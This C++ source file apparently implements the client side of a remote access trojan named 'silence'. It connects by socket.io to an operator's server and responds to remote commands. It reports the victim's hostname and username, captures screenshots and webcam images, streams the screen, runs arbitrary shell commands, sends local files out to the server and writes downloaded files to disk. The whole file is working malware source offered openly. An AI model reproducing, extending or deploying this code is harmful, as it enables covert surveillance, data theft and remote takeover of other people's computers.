#include <Client.h>

#define SIOSTR(str) sio::string_message::create(str)
#define SIOBOOL(boolean) sio::bool_message::create(boolean)
#define SIOBIN(bin) sio::binary_message::create(bin)

namespace silence {
    Client::Client(std::string url)
            : mUrl(std::move(url)), mIO(new sio::client()), mInstallDirectory(fs::current_path()),
              mUsername(impl::username()), mHostname(impl::hostname()), mHttpClient(mUrl.c_str()) {
        assert(mHttpClient.is_valid());
        mSocket = mIO->socket();

        mSocket->on("command",
                    [this](auto &&PH1, auto &&PH2, auto &&PH3, auto &&PH4) {
                        onCommand(std::forward<decltype(PH1)>(PH1),
                                  std::forward<decltype(PH2)>(PH2),
                                  std::forward<decltype(PH3)>(PH3),
                                  std::forward<decltype(PH4)>(PH4));
                    });

        mIO->set_socket_open_listener(
                [this](auto &&PH1) { onConnected(std::forward<decltype(PH1)>(PH1)); });
        mIO->set_close_listener(
                [this](auto &&PH1) { onClosed(std::forward<decltype(PH1)>(PH1)); });
        mIO->set_fail_listener([this] { onFailed(); });
    }

    Client::~Client() {
        mSocket->off_all();
        mSocket->off_error();

        mLock.lock();
        mCond.notify_all();
        mLock.unlock();
    }

    void Client::connect() {
        mIO->connect(mUrl);
        mLock.lock();
        mCond.wait(mLock);
        mLock.unlock();
    }

    void Client::onConnected(const std::string &nsp) {
    }

    void Client::onFailed() { std::cout << "sio failed" << std::endl; }

    void Client::onClosed(sio::client::close_reason const &reason) {
        std::cout << reason << std::endl;
        std::cout << "sio closed" << std::endl;
    }

    sio::message::list Client::createObject(const CommandObject &object) {
        auto obj = sio::object_message::create();
        obj->get_map() = object;
        return obj;
    }

    template<typename T, typename... Args>
    void Client::launchEvent(const std::function<T> &callable, Args &&... args) {
        std::thread thread{callable, args...};
        thread.detach();
    }

    void Client::onCommand(std::string const &name, sio::message::ptr const &data,
                           bool hasAck, sio::message::list &ack_resp) {
        auto commandObject = data->get_map();
        std::string event = commandObject["event"]->get_string();
        std::cout << event << std::endl;

        if (event == "greet")
            greetEvent();
        else if (event == "start_stream")
            launchEvent<void()>([this] { startStreamEvent(); }); // launch in new thread
        else if (event == "kill_stream")
            killStreamEvent();
        else if (event == "screenshot")
            screenshotEvent();
        else if (event == "webcamshot")
            webcamShotEvent();
        else if (event == "cd")
            cdEvent(commandObject);
        else if (event == "install_dir")
            installDirEvent(commandObject);
        else if (event == "cmd")
            cmdEvent(commandObject);
        else if (event == "upload")
            uploadEvent(commandObject);
        else if (event == "download")
            downloadEvent(commandObject);
        else
            response(event, SIOSTR("Unknown event"));
    }

    void Client::greetEvent() {
        mSocket->emit("add_client", createObject({{"hostname", SIOSTR(mHostname)},
                                                  {"username", SIOSTR(mUsername)},
                                                  {"os",       SIOSTR(mOS)}}));
    }

    void Client::screenshotEvent() {
        impl::Screenshot screen;
        cv::Mat image{screen.take()};

        response("screenshot", SIOBIN(impl::toBinaryString(image)));
    }

    void Client::webcamShotEvent() {
        try {
            cv::VideoCapture camera;
            cv::Mat image;

            camera.read(image);
            response("webcamshot", SIOBIN(impl::toBinaryString(image)));
        } catch (cv::Exception &) {
            response("webcamshot", SIOSTR("No camera found"));
        }
    }

    void Client::killStreamEvent() {
        std::unique_lock<std::mutex> lockGuard(mStreamLocker);

        if (!mStreamRunning) {
            response("kill_stream", SIOSTR("Stream is not running"));
            return;
        }

        mStreamRunning = false;
        response("kill_stream", SIOBOOL(true));
    }

    void Client::startStreamEvent() {
        std::unique_lock<std::mutex> lockGuard(mStreamLocker);
        if (mStreamRunning) {
            response("start_stream", SIOSTR("Stream is already running"));
            return;
        }
        mStreamRunning = true;
        lockGuard.unlock();

        response("start_stream", SIOSTR("Started stream"));
        impl::Screenshot screen;
        while (true) {
            lockGuard.lock();
            if (!mStreamRunning)
                return;
            lockGuard.unlock();

            cv::Mat image{screen.take()};
            mSocket->emit("frame", impl::toBinaryString(image));
        }
    }

    void Client::cdEvent(const CommandObject &object) {
        fs::path path{object.at("path")->get_string()};

        if (path.is_absolute())
            fs::current_path(path);
        else
            fs::current_path(fs::current_path() / path);
        response("cd", SIOBOOL("True"));
    }

    void Client::installDirEvent(const Client::CommandObject &object) {
        response("install_dir", SIOSTR(mInstallDirectory));
    }

    void Client::cmdEvent(const CommandObject &object) {
        response("cmd", SIOSTR(
                *impl::exec(object.at("command")->get_string().c_str())));
    }

    void Client::uploadEvent(const CommandObject &object) {
        fs::path path{object.at("file")->get_string()};
        std::ifstream fileStream(path);
        std::stringstream fileBuffer;
        fileBuffer << fileStream.rdbuf();

        httplib::MultipartFormDataItems items = {
                {"uploadFile", fileBuffer.str(), path.filename(), "application/octet-stream"},
        };
        auto result = mHttpClient.Post("/upload", items);

        if (result->status != 200)
            response("upload", SIOSTR("Something went wrong"));
        else
            response("upload", SIOSTR("Done"));
    }

    void Client::downloadEvent(const CommandObject &object) {
        fs::path filename{object.at("file")->get_string()};

        httplib::Params params{{"file", filename.string()}};
        auto result = mHttpClient.Get("/download", params, {});

        if (result->status != 200) {
            response("download", SIOSTR("Something went wrong"));
            return;
        }

        std::ofstream fileStream(object.at("path")->get_string());
        fileStream << result->body;
        response("download", SIOSTR("Done"));
    }

    void Client::response(const std::string &event, const sio::message::list &msg) {
        mSocket->emit("response",
                      createObject({{"event", SIOSTR(event)},
                                    {"data", msg[0]}}));
    }

} // namespace silence